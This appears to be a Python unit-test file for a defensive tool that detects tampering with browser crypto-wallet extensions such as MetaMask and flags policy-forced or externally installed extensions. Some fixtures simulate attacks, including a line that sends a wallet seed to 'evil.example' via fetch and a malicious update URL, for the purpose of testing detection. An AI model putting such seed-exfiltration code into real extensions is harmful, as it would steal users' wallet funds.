"""Simulated attacks for forced/unpacked extensions and wallet-code tampering. No real malware."""

import base64
import hashlib
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from walletguard import integrity, policies
from walletguard.extensions import Extension

METAMASK = "nkbihfbeogaeaoehlefnkodbefgpgknn"
STORE = "https://clients2.google.com/service/update2/crx"


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(data)


def make_store_extension(vdir, files):
    """Write files plus a verified_contents.json listing their tree hashes, like the Chrome store does."""
    for rel, data in files.items():
        write(os.path.join(vdir, rel), data)
    hashes = [{"path": rel, "root_hash": b64u(integrity.tree_hash(os.path.join(vdir, rel)))} for rel in files]
    payload = {"content_hashes": [{"block_size": 4096, "hash_block_size": 4096, "format": "treehash", "files": hashes}]}
    vc = [{"description": "treehash per file",
           "signed_content": {"payload": b64u(json.dumps(payload).encode()), "signatures": []}}]
    write(os.path.join(vdir, "_metadata", "verified_contents.json"), json.dumps(vc).encode())


class TreeHash(unittest.TestCase):
    def test_matches_chromium_definition(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "f")
            write(p, b"")
            self.assertEqual(integrity.tree_hash(p), hashlib.sha256(b"").digest())
            data = b"a" * 5000
            write(p, data)
            leaves = hashlib.sha256(data[:4096]).digest() + hashlib.sha256(data[4096:]).digest()
            self.assertEqual(integrity.tree_hash(p), hashlib.sha256(leaves).digest())


class StoreVerification(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.vdir = os.path.join(self.tmp.name, "13.0_0")
        make_store_extension(self.vdir, {
            "background.js": b"console.log('wallet')" * 500,
            "popup.html": b"<html></html>",
            "manifest.json": b"{}",
            "_locales/en/messages.json": b"{}",
            "images/icon.png": b"\x89PNG",
        })

    def tearDown(self):
        self.tmp.cleanup()

    def test_clean_install_ok(self):
        self.assertEqual(integrity.verify_against_store(self.vdir)["status"], "ok")

    def test_browser_rewritten_files_ignored(self):
        for rel in ("manifest.json", "_locales/en/messages.json", "images/icon.png"):
            write(os.path.join(self.vdir, rel), b"rewritten by the browser on install")
        self.assertEqual(integrity.verify_against_store(self.vdir)["status"], "ok")

    def test_patched_code_detected(self):
        write(os.path.join(self.vdir, "background.js"), b"fetch('https://evil.example/?seed='+seed)")
        v = integrity.verify_against_store(self.vdir)
        self.assertEqual(v["status"], "tampered")
        self.assertEqual(v["mismatched"], ["background.js"])

    def test_injected_script_detected(self):
        write(os.path.join(self.vdir, "inject.js"), b"steal()")
        v = integrity.verify_against_store(self.vdir)
        self.assertEqual((v["status"], v["extra"]), ("tampered", ["inject.js"]))

    def test_no_metadata(self):
        os.remove(os.path.join(self.vdir, "_metadata", "verified_contents.json"))
        self.assertEqual(integrity.verify_against_store(self.vdir)["status"], "no_metadata")


class Baseline(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.vdir = os.path.join(self.tmp.name, "13.0_0")
        make_store_extension(self.vdir, {"app.js": b"ok", "logo.png": b"png"})
        self.ext = Extension("Chrome", "Default", METAMASK, "MetaMask", "13.0", self.vdir)

    def tearDown(self):
        self.tmp.cleanup()

    def test_first_run_learns_quietly(self):
        findings, base = integrity.check_wallets([self.ext], {})
        self.assertEqual(findings, [])
        self.assertIn(self.ext.key, base)

    def test_same_version_change_is_critical_and_baseline_kept(self):
        _, base = integrity.check_wallets([self.ext], {})
        # Attacker patches the code and re-signs the store metadata so check 1 passes.
        make_store_extension(self.vdir, {"app.js": b"evil", "logo.png": b"png"})
        findings, new_base = integrity.check_wallets([self.ext], base)
        self.assertEqual([f.severity for f in findings], ["critical"])
        self.assertIn("app.js", findings[0].data["changed"])
        self.assertEqual(new_base[self.ext.key], base[self.ext.key])

    def test_non_code_change_is_high(self):
        _, base = integrity.check_wallets([self.ext], {})
        write(os.path.join(self.vdir, "logo.png"), b"different")
        findings, _ = integrity.check_wallets([self.ext], base)
        self.assertEqual([f.severity for f in findings], ["high"])

    def test_update_relearns(self):
        _, base = integrity.check_wallets([self.ext], {})
        make_store_extension(self.vdir, {"app.js": b"v14", "logo.png": b"png"})
        self.ext.version = "14.0"
        findings, new_base = integrity.check_wallets([self.ext], base)
        self.assertEqual(findings, [])
        self.assertEqual(new_base[self.ext.key]["version"], "14.0")


class Policies(unittest.TestCase):
    def test_parse_forcelist(self):
        self.assertEqual(policies.parse_forcelist_entry(f"abc;{STORE}"), ("abc", STORE))
        self.assertEqual(policies.parse_forcelist_entry("abc"), ("abc", ""))

    def test_parse_extension_settings(self):
        raw = json.dumps({"*": {"installation_mode": "blocked"},
                          "aaa,bbb": {"installation_mode": "force_installed", "update_url": STORE},
                          "ccc": {"installation_mode": "allowed"}})
        self.assertEqual(policies.parse_extension_settings(raw),
                         [("aaa", "force_installed", STORE), ("bbb", "force_installed", STORE)])
        self.assertEqual(policies.parse_extension_settings("not json"), [])

    def test_policy_severity(self):
        p = {"browser": "Chrome", "where": "HKLM\\x", "id": "evil", "mode": "force_installed", "update_url": STORE}
        self.assertEqual(policies.assess_policy_install(p, managed=False).severity, "high")
        self.assertEqual(policies.assess_policy_install(dict(p, update_url="https://evil.example/u.xml"),
                                                        managed=False).severity, "critical")
        self.assertEqual(policies.assess_policy_install(p, managed=True).severity, "medium")

    def test_external_install(self):
        self.assertEqual(policies.assess_external_install(
            {"browser": "Chrome", "where": "x", "id": "a", "update_url": STORE}).severity, "low")
        self.assertEqual(policies.assess_external_install(
            {"browser": "Chrome", "where": "x", "id": "a", "path": "C:\\Users\\u\\AppData\\x.crx"}).severity, "high")

    def test_profile_states(self):
        wallet_profiles = {("Edge", "Default")}
        state = {"browser": "Edge", "profile": "Default", "developer_mode": True, "settings": {
            METAMASK: {"location": 4, "path": "C:\\Users\\u\\AppData\\Local\\Temp\\mm"},
            "x" * 32: {"location": 4, "path": "C:\\dev\\myext"},
            "c" * 32: {"location": 5},
            "s" * 32: {"location": 1, "from_webstore": True},
        }}
        sev = sorted(f.severity for f in policies.assess_profile(state, wallet_profiles))
        self.assertEqual(sev, ["critical", "high", "medium"])
        other = dict(state, profile="Work")
        self.assertEqual(sorted(f.severity for f in policies.assess_profile(other, wallet_profiles)),
                         ["critical", "low", "medium"])

    def test_scan_policies_wiring(self):
        f = policies.scan_policies(policies=[], externals=[], states=[], wallet_profiles=set(), managed=False)
        self.assertEqual(f, [])


if __name__ == "__main__":
    unittest.main()
